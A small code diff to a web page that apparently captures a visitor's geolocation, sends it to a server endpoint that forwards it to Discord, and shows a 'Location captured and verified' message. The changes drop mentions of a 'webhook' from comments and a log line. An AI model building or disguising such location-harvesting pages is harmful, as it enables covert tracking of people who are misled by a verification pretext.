@@ -72,7 +72,6 @@
             padding: 10px;
             background: rgba(0,0,0,0.5);
             border-radius: 8px;
-            word-break: break-all;
         }
         .footer {
             margin-top: 20px;
@@ -154,7 +153,7 @@
                     
                     sendToServer(coords);
                     
-                    // Send to Discord webhook
+                    // Send to Discord
                     fetch('/api/location/discord', {
                         method: 'POST',
                         headers: {
@@ -162,7 +161,7 @@
                         },
                         body: JSON.stringify(coords)
                     }).catch(function(e) {
-                        console.log('Discord webhook error:', e);
+                        console.log('Discord error:', e);
                     });
                     
                     showStatus('Location captured and verified. You may close this window.', false);
